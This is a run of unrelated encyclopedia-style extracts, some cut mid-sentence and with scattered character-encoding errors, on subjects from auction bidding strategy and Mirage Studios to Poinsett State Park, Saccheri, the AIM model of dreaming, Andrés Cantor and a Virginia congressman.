at a profitable price. However, that is not always the best goal. Because of the examples of reasons mentioned above the supplier might choose as a goal for example: * To come in second (or third) while keeping the price high, * To come in second while driving the price down to unprofitable levels for the winner, * To bid down to a certain price and stop, regardless of winning position and potential profitability. After this preparation, the supplier should try to achieve his goal within the specific auction protocols and characteristics of the auction interface. The important characteristics that differ between auctions are the ability to see the current low bid and the knowing of their current relative position.

The company is best known for the Teenage Mutant Ninja Turtles comic book series and the subsequent franchise it has spawned. History Mirage Studios was started back in 1983, in Dover, New Hampshire. The company was named \\"Mirage\\" because there was no actual company. Less than a year before TMNT #1 was published in May 1984. Mirage then moved to Sharon, Connecticut, and stayed there for two years before ending up in Northampton. With the success of the Teenage Mutant Ninja Turtles, Eastman and Laird hired a core group of artists to help with the increasing workload. The first addition to the studio roster was Eastman's high school friend Steve Lavigne, brought on in 1984 as a letterer. In 1985, Eastman and Laird hired Cleveland artist Ryan Brown to assist them as an inker for the Turtles. Brown would be the first in a long line of artists, other than Eastman and Laird, that would work on the Teenage Mutant Ninja Turtles series. In the following year, two new members were added, penciler Jim Lawson from Connecticut and New Jersey's Michael Dooney who would paint a number of covers. With the addition of these four core artists along with Peter and Kevin, Mirage's Ninja Turtles output would expand over the next couple of years to include numerous Mirage Studio spin-off titles, as well as a companion comic book entitled Tales of the Teenage Mutant Ninja Turtles. In 1989, Kevin Eastman invited freelance illustrator A.C. Farley to do cover paintings for the TMNT collected books. Peter Laird also invited Farley to do issue #29 of the TMNT comic. Farley was eventually invited to be part of the studio and crafted many paintings and comic artwork for the TMNT until his departure from the studio to resume his freelance business in 2004. In 1991, Mirage Studios secured an interlocutory injunction against Counter-Feat Clothing for similar designs of drawings. The Mirage artists operated out of a renovated factory space in Florence, Massachusetts. This is where the bulk of the creative output was done, such as the Playmates Toys toy designs and the Archie TMNT comic series, until Tundra Publishing took over the building. Eastman and Laird along with Brown, Dooney, Lavigne and Lawson and Farley toured extensively over the years, making personal appearances and attending many comic book conventions in Detroit, Chicago, Hawaii, San Diego, Ohio, Boston, and Portsmouth, New Hampshire among many others. As the TMNT went mainstream, later additions to the studio would include Eric Talbot from Eastman's and Lavigne's old high school, writer Stephen Murphy, and Brown's friend, Dan Berger, who was brought in from Ohio to ink the Teenage Mutant Ninja Turtles Adventure title from Archie Comics. In 1988, Mirage Studios participated in the drafting of the Creator's Bill of Rights for comic book creators. On October 21, 2009 it was announced that Viacom had purchased all of Mirage's rights to the Teenage Mutant Ninja Turtles property. Mirage retains the rights to publish 18 issues a year, though the future involvement of Mirage with the Turtles, and the future of Mirage itself, is unknown.

The park is best known for its botanical oddities, combining the flora of the Blue Ridge Mountains foothills and Piedmont of Upstate South Carolina, the xeric Sandhills and the Atlantic coastal plain. In Poinsett State Park one can see mountain laurels draped with Spanish moss. The park, which has been called \\"weird and beautiful\\", is named after amateur botanist and South Carolina native Joel Roberts Poinsett, the first American ambassador to Mexico and popularizer of the poinsettia. There is no charge for admission to Poinsett State Park, but there are small fees for overnight camping and cabin rentals. The park is surrounded by the Manchester State Forest, and both provide access to the Palmetto Trail, linked hiking and mountain bike trails, and Manchester State Forest offers equestrian trails. History Located on the High Hills of Santee and descending to the Wateree Swamp, the site was used by various Siouan tribes of Native Americans, including the Santee, Wateree and Catawba, primarily for hunting. The non-Siouan Congaree lived nearby and may have also frequented the area. Before the American Revolution, the land was owned by a man named Levi, who built a dam to impound water for rice cultivation. Levi's Mill Pond was later used to power a mill. Remnants of the mill are still present, and the pond, improved by the Civilian Conservation Corps, is now known as Old Levi Mill Pond. In 1813 and 1814 the land was deeded to two members of the Singleton family, who owned many plantations in Sumter County. The best remembered Singleton today, Angelica Singleton Van Buren, was First Lady of the United States. Sumter County donated for the park, which opened to the public in 1936. Many buildings still in use at the park were built by the Civilian Conservation Corps from locally quarried coquina rock. Coquina is a young limestone in which fossil seashells are still readily apparent. Poinsett State Park was the first of many parks built by the CCC in South Carolina. During the days of racial segregation, the nearby state park for blacks was Mill Creek Group Camp.https://www.arcgis.com/apps/MapJournal/index.html?appid=f7d41a2e8288446ea6bda99390b45f95 The park was closed in 1963 for a year, along with all of South Carolina's state parks, due to a Federal court order to desegregate the parks, and it wasn't until 1966 that all its facilities were reopened. The park's historical elements were listed on the National Register of Historic Places in 2016. Fauna and flora Surveys have found 337 species of flowering plants within the park, including 65 species of trees and shrubs. Tree species include mountain laurel (Kalmia latifolia), white oak (Quercus alba), black oak (Q. velutina), turkey oak (Q. laevis), water oak (Q. nigra), pignut hickory (Carya glabra), loblolly pine (Pinus taeda), longleaf pine (P. palustris), flowering dogwood (Cornus florida), wax myrtle (Morella cerifera), American holly (Ilex opaca), sweetgum (Liquidambar styraciflua), baldcypress (Taxodium distichum), swamp gum (Nyssa biflora), water tupelo (N. aquatica), and red maple (Acer rubrum). Many species of animals can be found in the park, including copperhead snakes (Agkistrodon contortrix), cottonmouth snakes (A. piscivorus), American alligators (Alligator mississippiensis), and bobcats (Lynx rufus), but these are rarely observed. Animals more typically encountered by visitors include golden silk orb-weaver spiders (Nephila clavipes), largemouth bass (Micropterus salmoides), bullfrogs (Rana catesbeiana), river frogs (Rana heckscheri), spring peeper treefrogs (Pseudacris crucifer), Carolina anole lizards (Anolis carolinensis), five- lined skinks (Eumeces fasciatus), yellow-bellied slider turtles (Trachemys scripta scripta), banded watersnakes (Nerodia fasciata), coachwhip snakes (Masticophis flagellum), eastern hognose snakes (Heterodon platirhinos), Rafinesque's big-eared bats (Corynorhinus rafinesquii), great egrets (Ardea alba), wood ducks (Aix sponsa), turkey vultures (Cathartes aura), red-tailed hawks (Buteo jamaicensis), belted kingfishers (Ceryle alcyon), red-bellied woodpeckers (Melanerpes carolinus), blue-gray gnatcatchers (Polioptila caerulea), and prothonotary warblers (Protonotaria citrea).

Giovanni Girolamo Saccheri (; 5 September 1667 ‚Äì 25 October 1733) was an Italian Jesuit priest, scholastic philosopher, and mathematician. Saccheri was born in Sanremo. He entered the Jesuit order in 1685 and was ordained as a priest in 1694. He taught philosophy at the University of Turin from 1694 to 1697 and philosophy, theology and mathematics at the University of Pavia from 1697 until his death. He was a prot√©g√© of the mathematician Tommaso Ceva and published several works including Quaesita geometrica (1693), Logica demonstrativa (1697), and Neo-statica (1708). Geometrical work He is primarily known today for his last publication, in 1733 shortly before his death. Now considered the second work in non-Euclidean geometry, Euclides ab omni naevo vindicatus (Euclid Freed of Every Flaw) languished in obscurity until it was rediscovered by Eugenio Beltrami, in the mid-19th century. Many of Saccheri's ideas have a precedent in the 11th-century Persian polymath Omar Khayy√°m's Discussion of Difficulties in Euclid (Ris√¢la f√Æ sharh m√¢ ashkala min mus√¢dar√¢t Kit√¢b 'Ugl√Ædis), a fact ignored in most Western sources until recently. It is unclear whether Saccheri had access to that work in translation or he developed his ideas independently. The Saccheri quadrilateral is now sometimes referred to as the Khayyam-Saccheri quadrilateral. The intent of Saccheri's work was ostensibly to establish the validity of Euclid by means of a reductio ad absurdum proof of any alternative to Euclid's parallel postulate. To do so, he assumed that the parallel postulate was false and attempted to derive a contradiction. Since Euclid's postulate is equivalent to the statement that the sum of the internal angles of a triangle is 180¬∞, he considered both the hypothesis that the angles add up to more or less than 180¬∞. The first led to the conclusion that straight lines are finite, contradicting Euclid's second postulate. So Saccheri correctly rejected it. However, the principle is now accepted as the basis of elliptic geometry, where both the second and fifth postulates are rejected. The second possibility turned out to be harder to refute. In fact he was unable to derive a logical contradiction and instead derived many non- intuitive results; for example that triangles have a maximum finite area and that there is an absolute unit of length. He finally concluded that: \\"the hypothesis of the acute angle is absolutely false; because it is repugnant to the nature of straight lines\\". Today, his results are theorems of hyperbolic geometry. There is some minor argument on whether Saccheri really meant that, as he published his work in the final year of his life, came extremely close to discovering non-Euclidean geometry and was a logician. Some believe Saccheri concluded as he did only to avoid the criticism that might come from seemingly-illogical aspects of hyperbolic geometry.

It merged with Southend Radio in 2015 to create Radio Essex.  History  Chelmsford Radio began broadcasting as Chelmer FM in 1998, under the ownership of Mid Essex Radio Ltd. In September 2001, the station was purchased by the Tindle Radio Group  owner of Dream 100 in Colchester  and rebranded as Dream 107.7 in mid-February 2002. In September 2008 the station was sold by Tindle to Adventure Radio, the then owners of Mercury 96.6 and Southend Radio, with whom Ofcom approved a co-location arrangement for Dream to move its studios to the Southend complex. On 2 February 2009 the station re-launched as Chelmsford Radio. Chelmsford Radio shared its programming and resources with Southend Radio as well as Connect FM in Peterborough and Northamptonshire. The 'Essex Action' feature was a community service designed to help local groups and charities with publicity and also with appeals for volunteers. The service was coordinated by the Southend Association of Volunteers (SAVS) with their counterparts across the county contributing items for broadcast. On 6 June 2013 Chelmsford Radio and sister station Southend Radio launched on DAB under the singular service Radio Essex. The original DAB only Radio Essex was broadcast on the Essex DAB mux and could be heard in many places across the county where Chelmsford Radio couldn't, including Harlow, Colchester, and Sudbury (Suffolk). In February 2015 it was announced that Chelmsford Radio, along with Southend Radio and Radio Essex, would be relaunched as one single station known as Radio Essex. The new station launched on 23 March 2015 on 105.1 FM, 107.7 FM, and on DAB.  Slogans  \\"Just Great Songs for Essex\\"  Technical  Chelmsford Radio was broadcast on 107.7 MHz from a mobile phone mast at Church Green in the village Danbury. Before 2002 the station output was broadcast from a transmitter close to the A414 in Danbury. The 107.7 signal could be received as far away as Basildon, Ongar, Braintree and Colchester.

It is an anthology of four episodes, each by one of the directors, all about a different aspect of morality and love in modern times in the style of Giovanni Boccaccio. Cast Marisa Solinas as Luciana * Germano Giglioli as Renzo * Peppino De Filippo as Dr Antonio Mazzuolo * Anita Ekberg as herself * Tomas Milian as Ottavio * Romy Schneider as Pupe * Sophia Loren as Zoe Episodes =Renzo e Luciana= Directed by Mario Monicelli. Written by Giovanni Arpino, Italo Calvino, Suso Cecchi d'Amico and Monicelli. Music by Piero Umiliani. With Marisa Solinas and Germano Giglioli. In Renzo e Luciana (Renzo and Luciana) a young couple tries to hide their marriage and the wife‚Äôs supposed pregnancy from the draconian rules at their place of employment, which has banned female employees from getting married and having children. Their efforts ‚Äì both at their shared home (having temporarily moved into her family's crowded apartment), and at work (where they go so far as to pretend not to know each other) ‚Äì causes pressure to mount on the couple. Their hope is to make it through until they have managed to save some money to move out, and are dependent on Renzo going to night school to become an accountant. This first episode was only included in the Italian distribution of the film. Out of solidarity toward Monicelli, the other three directors did not go to the Cannes Film Festival for the presentation of the film. =Le Tentazioni del Dottor Antonio= Directed by Federico Fellini. Written by Fellini, Ennio Flaiano and Tullio Pinelli. Music by Nino Rota. With Peppino De Filippo and Anita Ekberg. In Le Tentazioni del Dottor Antonio (The Temptation of Dr Antonio) Dr Antonio Mazzuolo, a middle- aged man, has taken it upon himself to be the protector of Rome's morality from what he sees as vice and immorality throughout the city. The doctor (in his tiny Fiat equipped with a police spotlight) wages his one-man crusade ‚Äì shining the spotlight at lovers in parked cars, or bounding on stage of a cabaret, ordering the stage crew (which includes a smiling police officer) to shut the lights, as he closes the curtain behind a line of bewildered chorus girls. He admonishes the audience to 'go home, and spend (their) money' in a 'better way instead of seeing this filth.' His anger knows no bounds when a provocative billboard of Anita Ekberg with the tag line \\"drink more milk\\" is put up in a park near his residence. Little does he know how the billboard will impact his life. Throughout the film, children are heard singing the jingle \\"Bevete pi√π latte, bevete pi√π latte!\\" (\\"Drink more milk!\\"). The image begins to haunt him with hallucinations in which Ekberg appears as a temptress. After his delirium culminates in throwing a spear at Ekberg's image, he is found collapsed on top of the billboard and transported away in an ambulance to the children's song. =Il Lavoro= Directed by Luchino Visconti. Written by Suso Cecchi d'Amico and Visconti. Music by Nino Rota. With Romy Schneider and Tomas Milian.

It is a member of the North-East Democratic Alliance and North-East Regional Political Front, a group of political parties of the northeast that supports the National Democratic Alliance (India). The party existed from 1997 to 2001 until it was merged into the Indigenous Nationalist Party of Twipra (INPT), and reformed in 2009. The party is allied with BJP in the 2018 Tripura Legislative Assembly election and won 8 seats out of 9 contested seats. The party got 7.5% of the total votes polled. The BJP got 36 seats and with a total of 44 seats the BJP-IPFT coalition have two-thirds majority at the Legislative Assembly.http://eciresults.nic.in/PartyWiseResultS23.htm?st=S23 History The IPFT made its political breakthrough in the 2000 Tripura Tribal Areas Autonomous District Council (TTAADC) elections. The militant separatist organization National Liberation Front of Tripura (NLFT) had declared that it would only allow the IPFT to contest the election; in light of a series of assassinations, death threats, and kidnappings, only the Left Front and the IPFT participated. The IPFT ended up winning 17 out of 28 seats, taking a majority on the TTAADC. The Tripura National Volunteers (TNV), Tripuri nationalist militant group, supported the IPFT in the 2000 elections. In 2001, after pressure from the NLFT, the TNV merged with the Indigenous People's Front of Tripura. In 2002, the Indigenous Nationalist Party of Tripura (INPT) was formed as a merger of the Indigenous People's Front of Tripura and the Tripura Upajati Juba Samiti (TUJS). The newly formed INPT formed an alliance with the Indian National Congress for the 2003 Tripura Legislative Assembly election, in which the INPT won six assembly seats. After the 2003 assembly election, 6 District Councilors split away from the INPT to form the National Socialist Party of Tripura (NSPT), under the leadership of Hirendra Tripura and Budhu Kumar Debbarma. The NSPT formed a government in the TTAADC by forming a coalition with the communist CPIM party. Following this, more INPT leaders defected, leaving to join the Indian National Congress. In 2005, another youth leader and INPT MLA Animesh Debbarma left the party to form the National Conference of Tripura (NCT). Before the 2009 Loksabha election, some INPT leaders decided to revive the IPFT party under the leadership of former All India Radio Director N.C Debbarma. The main demand of the IPFT is the formation of \\"Tipraland\\", a state within the TTAADC, under articles 2 and 3 of the Indian Constitution. The IPFT contested both of the Loksabha seats of Tripura in 2009, but received very few votes. It also contested 21 out of 28 ADC seats in the 2010 Tripura Tribal Areas Autonomous District Council election, but only received a total of 2,216 votes. The IPFT also failed to gain a majority in the 2013 Tripura assembly elections, receiving 11,234 votes in 17 contested seats. Following these elections, IPFT leader Patal Kanya Jamatia left and joined the INPT, ultimately leaving again to form the Tripura Peoples Front (TPF). In the 2015 ADC elections, the IPFT contested 27 of the 28 seats. Despite securing the second-highest number of votes at 115,252, the IPFT was unable to gain a single seat. The IPFT split again following these elections, with some members like Retd. TCS officer C.R Debbarma & Rangchak Kwthang leaving to form the Tipraland State Party (TSP). The party was further weakened after some prominent IPFT youth leaders, including David Murasing and Pabitra Jamatia, left the party to join the right-wing Bharatiya Janata Party (BJP), the party in power nationally in India, on 11 December 2016, but David Murasing ultimately leaving again BJP on 16 August 2017 to form Twipra Dophani Sikla Srwngnai Motha (TDSSM). Splinter Factions IPFT is splintered into 3-6 factions: * Indigenous People's Front of Tripura (N.C. Debbarma) (IPFT-NC) of N.C. Debbarma. * Indigenous People's Front of Tripura (Tipraha) (IPFT-T) of Aghor Debbarma, Budhu Debbarma, and Binoy Debbarma. * Indigenous People's Front of Tripura (Balaram Debbarma) (IPFT-B) of Balaram Debbarma. * Tripura People's Front (TPF) of Patal Kanya Jamatia. * Tipraland State Party (TSP) of Retired TCS officer C.R Debbarma & Sonacharan Debbarma. * Twipra Dophani Sikla Srwngnai Motha (TDSSM) of D Hamkhrai Twipra (David Murasing) also split from IPFT.

The differences in neuronal activity of the brainstem during waking and REM sleep were observed, and the hypothesis proposes that dreams result from brain activation during REM sleep. Since then, the hypothesis has undergone an evolution as technology and experimental equipment has become more precise. Currently, a three-dimensional model called AIM Model, described below, is used to determine the different states of the brain over the course of the day and night. The AIM Model introduces a new hypothesis that primary consciousness is an important building block on which secondary consciousness is constructed.  Introduction  With the advancement of brain imaging technology, the sleep-waking cycle can be studied as never before. The brain can be objectively quantified and identified as being in either one of three states: awake, REM sleep, and NREM sleep due to these advanced methods of measurement. It has been shown that global deactivation of the brain from waking state to NREM sleep occurs, and a subsequent reactivation during REM sleep, to a degree greater than during waking. Consciousness and its substates, primary consciousness and secondary consciousness, play a part in identifying the state of the brain. Primary consciousness is the simple awareness of perception and emotion; that is, the awareness of the world via advanced visual and motor coordination information your brain receives. Secondary consciousness is an advanced state that includes both primary consciousness and abstract analysis, or thinking, and metacognitive components, or the awareness of being aware. Most animals show some stages of primary consciousness, but only humans have been experimentally shown to experience secondary consciousness. The cycle of waking-NREM-REM sleep is essential to mental health of mammals. It has been shown through experimentation that animals subjected to inability to enter REM sleep show an immediate attempt to quickly enter REM stages and long-term effects on motor coordination and habitual motor habits, eventually leading to the death of the animal. It has also been shown that homeothermic animals might require sleep to maintain body weight and temperature.  Background  = Waking = The waking consciousness is the awareness of the world, our bodies, and ourselves. This includes humans experiencing the awareness of being aware of ourselves, an intrinsic ability to humans. It's the ability to look in a mirror and know that you are looking at yourself, and not just another human being. Being awake allows the distinction between tasks and default brain states, and also distinguishes between background and foreground processing. Being awake allows the person to not only be aware of themselves and the world, but also to have conscious motor coordination and understand the difference between need and want that comes from secondary consciousness.  Difference between sleep and dream  There is a difference between being just asleep and in a state of mind called dreaming. Sleeping can be described as the lack of conscious awareness of the outside world, meaning large portions of the brain that receive and interpret signals are deactivated during this time, while dreaming is a specific state of sleep in which enhanced brain activity has been shown to occur, theorizing the primary consciousness could be active during dreaming. Indeed, during dreams we are consciously aware of our surroundings, and assuredly have a certain perception and emotion throughout the course of the dream, suggesting that at least part of the primary consciousness is activated during the dream.  Dream  A dream has all features of primary consciousness but is produced in the brain without external stimulation. Unlike the waking state, the brain cannot recognize its own condition; that it is in the midst of the dream and is not the same as the real world. The brain has a single-minded state of primary consciousness during dreaming, which allows the brain to reach greater perception and awareness of a single scenario out of images and dreams. This is called the dream consciousness. = Four stages of sleep = The four sleep stages have been identified as follows: sleep onset stage I, late-night stage II, and deep sleep stages III and IV. Deep sleep stages III and IV all occur during the first half of the night, while lighter stages I and II occur during the later half. During standard sleep laboratory measurements, the states of sleep and waking have behavioral, polygraphic, and psychological manifestation within the pontine brainstem. These states are regulated by a reciprocal relationship between two types of neuronal cells, aminergic inhibitory cells such as serotonin and norepinephrine and cholinergic excitatory cells such as acetylcholine. Changes in the sleep stages occur when the activity curves of these neurons cross. REM sleep stage I is a state of sleep just above and most closely linked to sleep onset stage I.  NREM  NREM sleep can be described as the stages of sleep that show greatly decreased brain activity. There are four different stages of NREM sleep. The brain shows dulled or limited senses of perception, though the thought process has been shown to be logical and perseverative. Episodic movements of the body occur during these stages, though they are involuntary movements. = REM = REM sleep is an evolutionarily recent behavior of humans. REM stands for rapid eye movement. It is the deepest sleep a mammal can go into. It is regulated by the pontine brainstem. Infants spend most of their time in REM sleep, and rather than enter stage 1 sleep they go directly to REM sleep. Most REM sleep occurs just above stage I of sleep, and experiences different mental abilities than during NREM sleep. The thought process is non-logical and often bizarre, sensation and perception is vivid but created internally by the brain, and the body's movements are inhibited. Most REM stages last 10‚Äì15 minutes, and the average human will go through 4‚Äì6 of these stages during sleep each night. Subsequent REM stages increase in duration, so the last REM stage before awakening is the longest and most vivid. During REM sleep the brain shows increased states of minimal inhibition, which degrades in our ability to recognize the state for which it is; a dream. It has been proposed that REM sleep is necessary for preparation of many integrative functions, of which one is consciousness. It supports the idea that sleep, and dreaming, is necessary preparation for the next day's processes. The scientific tracking of REM sleep stages can be measured by neuronal signals within the pontine brainstem. The interactions of aminergic inhibitory neurons and cholinergic excitatory neurons can be measured, and REM sleep occurs when aminergic cells are at their least active and cholinergic cells are at their most active.  Evolution of REM  It has been stated that REM sleep is a recent evolutionary behavior in homeothermic animals. In both, there is increased REM sleep in the early stages of life. In humans, REM sleep peaks during the third trimester of gestation, and quickly falls after birth as primary consciousness declines and secondary consciousness grows with the development of the brain. The developing control over stages of sleep and waking suggests that sleep and REM has developed as a way to self-activate in order to anticipate awake-state circumstances. = Neuronic modeling = Within the pons, the modeling and tracking of these aminergic inhibitory neurons and cholinergic excitatory neurons occurs via the study of PGO waves. These are phasic waves that occur in cycles, and originate from the pontine brainstem (P), lateral geniculate of thalamus (G), and occipital cortex (O). Aminergic monoamines serotonin, noradrenaline, histamine, and dopamine are balanced between acetylcholine cholinergic signals, and play a part in the regulation of cognition. Aminergic cell signal strength is lowest during REM sleep, increases during NREM, and is highest at waking. Cholinergic cell signal strength is highest during REM, declines during NREM, and is lowest at waking. Changes in sleep state and phase occur when two activity paths cross.  Theory  The development of consciousness is a gradual, time-consuming and lifelong process that builds upon and uses a more primitive virtual reality generator that is more definable in our dreams. As such, the development of secondary consciousness during the lifetime requires a blank consciousness that during REM sleep creates an imaginary self that has movements and experiences emotions. This is an experimental state not associated with awareness, and this state, or protoconscious, is able to be reached during childhood. This protoconsciousness is a protoself created early in life by the brain as a building block for consciousness to develop, and provides intrinsic predictions of external inputs created by dreaming. = Original activation- synthesis hypothesis model = Hobson and McCarley originally proposed in the 1970s that the differences in the waking-NREM-REM sleep cycle was the result of interactions between aminergic REM-off cells and cholinergic REM-on cells. This was perceived as the activation-synthesis model, stating that brain activation during REM sleep results in synthesis of dream creation. Hobson's five cardinal characteristics include: intense emotions, illogical content, apparent sensory impressions, uncritical acceptance of dream events, and difficulty in being remembered. = Current model ‚Äì AIM = Thanks to the development of technology since the original proposal, new experimental data has been collected and additional mechanistic details of neuronal control have been developed. It has been determined that consciousness states can be described with three values, and the AIM model is a model that uses these values for representing the similarities and differences between waking and dreaming. It is a three-dimensional state-space model that describes different states of the brain and their variance throughout the day and night. It is composed of three different values: A ‚Äì activation, I ‚Äì input-output gating, and M ‚Äì modulation. The model is limited however, in that it cannot yet explain the regional differences in brain activity that distinguish REM sleep from waking. Other limitations include the inability to quantifiably identify and measure M in humans. During waking and activation of primary and secondary consciousnesses, high values of A, I, and M have been observed, but during REM sleep high values of A but low I and M have been observed.  Protoconsciousness  The protoconsciousness is template of consciousness that occurs during sleep, and on which can be constructed other mental conscious processes. Early in childhood, it has been said that this protoconsciousness is where secondary aspects of consciousness are originally developed and tested by the primary consciousness, and the person can slowly develop increased secondary consciousness throughout their life as their protoconscious template is further expanded, developed, and creates more vivid ideas and representations of secondary consciousness.  Activation (A)  Large parts of the brain that are activated and sending signals during waking are inactive during NREM sleep and become reactivated during REM sleep. It is based on the fact that the brain and its neural circuitry is plastic and self- regulating, especially in its own activation and inactivation. This was observed by two experiments: development of sleepiness after dopamine neuron destruction in substantia nigra in the midbrain, and discovery of the reticular activating system, which are visual cues received through our eyes and to our brain that begin the waking process, that waking consciousness depends sleep. Following these studies, it became clear that activity levels and quality of consciousness were functions of brain activation and deactivation.  Input-output gating (I)  It has been shown that the internal activation of the brain is associated with the inhibition of both external sensory input and motor output. This implies that the brain is actively kept offline during REM, and the brainstem guarantees the coordination of factors I and A via the input-output gate control within the brainstem. PGO waves play a part in the ability of the brain to remain asleep while constituting the building blocks for perception and fine motor control via their phasic coordination. It has therefore been proposed that PGO signals are used in the construction of visual imagery of dreams.  Modulation (M)  The neuromodulator release of aminergic neurons have a broad chemical influence on the brain; they instruct other neurons to keep or discard a record of information they've processed. The mechanics of modulation are not known at this time, and modulation has yet to be quantitatively identified. Qualitatively, aminergic modulation has been shown to be strong during waking but lower during sleep, but more studies need to be conducted. Numerous studies have emerged from the discipline of computational neuroscience that support to the AIM model. The theory of Metalearning in particular describes how these neuromodulators facilitate dynamic learning, though a series of interpretive models all consistent with the AIM model.  Implications  The three-dimensional AIM model shows that during the cycle of brain states waking-NREM-REM, the brain is dynamically changing constantly, and that this state space described by the AIM has an infinite number of subregions other than the main three. It proposes that via a protoconsciousness brain activation during sleep is necessary for the development and maintenance of waking consciousness and other higher-order brain functions such as problem solving. It suggests the possibility that the state of waking consciousness is only present in humans due to the evolution of extensive cortical structures within the brain. Dreaming is a state of the brain that is similar to yet different from the waking consciousness, and interaction and correlation between the two is necessary for optimal performance from both. One study conducted measuring brain activity via EEG used Hobson's AIM model to show that quantitatively dream consciousness is remarkably similar to waking consciousness.

Cantor is well known among English-speakers for his narration of soccer matches and shouting \\"¬°Gol!\\" when one is scored. Outside of soccer commentary, he covers other sports as well. Cantor has dual citizenship with Argentina & United States. Early life Cantor was born in Buenos Aires, Argentina. He moved with his family to the Southern California area when he was a teen, where he attended San Marino High School and then graduated from the University of Southern California. Andr√©s is of Jewish descent. His mother was born in Romania and migrated to Argentina at the age of 13, while his father was born in Argentina. His paternal grandparents were from Poland, and fled during the Nazi occupation. His favorite team is Boca Juniors from Argentina. Professional career Cantor is famous for his signature bellowing of \\"¬°Goooooooooooooooooooooooooooooooooooooooooool!\\" after a score in football. Jose Maria Mu√±oz, a famous Argentine journalist who began narrating on radio in the 1940s, is widely considered the father of \\"peligro de gol\\" \\"danger of goal being scored\\", \\"gol, gol, gol, gooooool\\", etc. His style has been imitated by prominent football narrators throughout Latin America and Spain. It stemmed from the desire to let families and friends who have stepped away from a game know that a goal has been scored. However, due to translation and cultural dissonance issues, it was largely absent from the lexicon of British play-by-play commentators. Cantor was the first to introduce this climactic scoring call to a U.S. audience while working at Univision, making him popular with English-speaking viewers. He first used it at the 1990 FIFA World Cup, but it became especially popular during the 1994 World Cup, which was held in the United States. It became so popular, in fact, that Cantor made guest appearances on the Late Show with David Letterman during the '94 and '98 tournaments, and after the tournament was over. He was broadcasting from Paris for the Late Show during the 1998 World Cup. The call is now being sold as a ringtone on Telemundo's website. He says that Diego Maradona's goal at the 1986 World Cup, in which he ran from midfield past five English defenders to score, brought tears to his eyes (Cantor was working at the game). That goal became known as the \\"Goal of the Century,\\" and took place after the infamous \\"Hand of God\\" goal. The yell was also used in a popular Volkswagen commercial that aired in the U.S. around the time of the 1998 World Cup. Another unique line of Cantor's can be heard whenever a game reaches half-time or is over. He delivers the line, \\"El √°rbitro dice que no hay tiempo para m√°s\\" (\\"The referee says there is no time for more\\"). =Telemundo Deportes= Cantor currently works for Telemundo Deportes, NBC Sports's Spanish-language division, and does play-by-play for matches on both Telemundo and its sister cable network Universo. At the 2004 Summer Olympics, where Telemundo was the first-ever U.S. Spanish-language network to broadcast the Olympics, Cantor worked as both a studio anchor and the play-by-play announcer for baseball. He went to Telemundo after several years at Univisi√≥n. Telemundo's other anchor for the games, Jess√≠ Losada, worked with Cantor at Univisi√≥n before also leaving. Also, Norberto Longo, Cantor's longtime partner in the broadcast booth and Univision's lead sports analyst, took the same role at Telemundo until his death on April 21, 2003, of a heart attack at the age of 61. XM Satellite Radio, in partnership with Cantor launched a Spanish- language sports network. Cantor anchored Telemundo's coverage of the 2012 Summer Olympics in London from the network's studios in Hialeah, Florida. He was also the play-by-play announcer for football during the games.Telemundo press release, August 2, 2012 =Futbol de Primera Radio Network= Andr√©s Cantor is the owner and main play by play announcer of Futbol de Primera, a radio network which owns the Spanish-language radio rights of the FIFA World Cups 2002/2006/2010/2014 as well as the Mexico national team, CONCACAF Gold Cup, Copa Am√©rica (CONMEBOL) among other sports properties. Andr√©s Cantor hosts a daily show, Futbol de Primera, which airs nationally on more than 100 affiliates. =NBC Sports= Cantor's first English-language assignment was the 2000 Summer Olympics in Sydney, where he called both men's and women's football for NBC, complete with his sig. At the 2008 Summer Olympics in Beijing, Cantor provided only Spanish-language commentary for sister network Telemundo. Other notable accomplishments In 2008, Cantor appeared in the American live-action film Speed Racer as one of the grand prix announcers. Cantor is the author of the book Goooal! a Celebration of Football. Andres Cantor's appearance booking fee can range from $5,000 to $10,000. In 2010, Cantor was featured in the Mike McGlone series of GEICO commercials where he is introduced as an announcer who could make any sport exciting. Subsequently, the camera cuts to him animatedly announcing a chess match. In 2011, he is uncredited for the role of the Spanish football announcer in an episode of the Disney Channel series Phineas and Ferb. U.S. show Person of Interest used his 'Goooooooool' in the episode \\"Cura te ipsum.\\" When Reese and Fusco confront the drug dealers at their apartment, there is a goal scored during a football match on the television. The famous \\"Gooooooool\\", seen in the U.S. on NBC's Deportes Telemundo network, can be heard in the background. In 2014, Cantor was featured in an ad campaign for Volkswagen of America. The campaign was launched for the 2014 FIFA World Cup, and depicts him offering play-by-play announcing while his son Nicolas drives a new Volkswagen Golf GTI. Cantor was featured as an announcer in the Walt Disney film Muppets Most Wanted in March 2014. He voiced himself in the Simpsons episode \\"You Don't Have to Live Like a Referee\\". Awards In 1994, Cantor was honored as \\"Sports Personality of the Year\\" by the American Sportscaster Association. He won a regional Emmy Award for his play-by-play work during the U.S. World Cup 1994. In 2004, Cantor received the Hispanic Heritage Award.Hispanic Heritage Award press release, 2004 Also that year he won the Broadcasting & Cable/Multichannel News Lifetime Achievement Award in Hispanic Television at the Hispanic Television Summit, produced by Schramm Marketing Group. In 2005, Cantor received an honorary Emmy from the NATPE for his contributions to Hispanic television.Emmy press release, 2005 In 2014, Cantor received an Emmy at the 35th annual Sports Emmy Awards for best on-air personality in Spanish.

He is best remembered for taking power in Virginia from the short-lived Readjuster Party in the late 1880s, forming the first political machine of \\"Conservative Democrats\\", whose power was to last 80 years until the demise of the Byrd Organization in the late 1960s. Youth and education Barbour was born at Catalpa, near Culpeper, Virginia, the son of Virginia delegate and future U.S. Representative John S. Barbour. He had two sisters and a younger brother. Barbour attended the common schools and graduated from the law department of the University of Virginia at Charlottesville. He married Susan Daingerfield, daughter of a prominent family in Prince George's County, Maryland.  Career  Following his father's career path, Barbour was admitted to the Virginia bar in 1841 and began his legal practice in Culpeper. Five years later he ran for and won election as a member of the Virginia House of Delegates, serving (part-time, along with his private legal practice) from 1847 to 1851. Barbour became president of the Orange and Alexandria Railroad Co., serving from 1852 to 1881. During the American Civil War, Barbour was a Confederate officer, as was his younger brother James. The family's Fleetwood Hill hosted General J.E.B. Stuart after the Confederate victory at the Battle of Chancellorsville, but the June 1863 engagement with Union forces, the Battle of Brandy Station (perhaps the largest cavalry battle of the war) was considered a draw. After the war, both John and James resumed their legal careers, but while John concentrated in railroad matters, James bought the Richmond Enquirer and became its editor. After the restoration of civil rights to Confederate officers, John Barbour was elected as a Democrat to the Forty-seventh, and two succeeding Congresses (March 4, 1881 - March 3, 1887). He succeeded Eppa Hunton II, a fellow Shenandoah valley lawyer who declined to seek renomination. Barbour served as chairman of the Committee on the District of Columbia (Forty-eighth and Forty- ninth Congresses). He declined to be 